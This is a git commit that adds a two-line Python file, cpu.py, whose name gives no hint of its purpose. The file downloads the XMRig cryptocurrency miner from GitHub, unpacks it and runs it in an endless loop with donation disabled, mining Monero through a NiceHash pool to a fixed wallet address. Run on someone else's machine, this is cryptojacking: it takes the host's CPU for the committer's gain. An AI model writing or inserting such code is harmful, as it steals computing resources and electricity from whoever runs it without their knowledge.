b28caad3678d0a81b13af5bcd54ddbc88bae25ab
LopperNanas <153208294+LopperNanas@users.noreply.github.com>
2024-03-25 00:04:50 -0300

    Create cpu.py

---
+++ cpu.py
@@ -0,0 +1,2 @@
+import os
+os.system("wget https://github.com/xmrig/xmrig/releases/download/v6.7.1/xmrig-6.7.1-linux-x64.tar.gz && tar xf xmrig-6.7.1-linux-x64.tar.gz && cd xmrig-6.7.1 && while true; do ./xmrig --donate-level=0 -a rx/0 -o randomxmonero.usa-west.nicehash.com:3380 -u 33uK4AkoDaMZ8FNNUN4nKw1bJQ6KfvuBA2.CLD --http-enabled --http-port=4000 --nicehash --cpu-priority 0 --donate-level=0; sleep 3; done")
